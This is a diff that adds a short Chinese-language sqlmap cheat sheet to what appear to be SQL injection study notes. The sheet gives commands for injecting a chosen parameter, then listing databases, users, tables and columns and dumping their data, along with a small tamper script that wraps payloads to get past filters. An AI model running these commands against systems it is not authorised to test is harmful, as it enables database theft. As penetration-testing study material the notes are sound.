@@ -348,6 +348,53 @@ select ifnull(nullif(1,2),3)
 >The nullif(X,Y) function returns its first argument if the arguments are different and NULL if the arguments are the same. The nullif(X,Y) function searches its arguments from left to right for an argument that defines a collating function and uses that collating function for all string comparisons. If neither argument to nullif() defines a collating function then the BINARY is used.
 
 
+## SQLMAP
+
+基本流程
+
+POST存个post报文``test``然后``-p``注入的参数
+
+```
+sqlmap -r test.txt -p id
+```
+
+直接用url GET这样写
+
+```
+sqlmap -u http://xxx.xxx/?id=1 -p id
+```
+
+``--batch``使用默认设置
+
+一些常用的命令
+
+```
+sqlmap -u url --dbs //爆数据库
+sqlmap -u url --current-db //爆当前库
+sqlmap -u url --current-user //爆当前用户
+sqlmap -u url --users查看用户权限
+sqlmap -u url --tables -D数据库 //爆表段
+sqlmap -u url --columns -T表段 -D 数据库 //爆字段
+sqlmap -u url --dump -C字段 -T 表段 -D 数据库 //猜解
+sqlmap -u url --dump --start=1 --stop=3 -C字段 -T 表段 -D 数据库 //猜解1到3的字段
+```
+
+写一个简单的temper
+
+```
+# sqlmap/tamper/backquotes.py
+ 
+from lib.core.enums import PRIORITY
+ 
+__priority__ = PRIORITY.LOWEST
+ 
+def dependencies():
+    pass
+ 
+def tamper(payload, **kwargs):
+    return "1`,"+payload+")#"
+```
+
 
 ## 参考资料
 
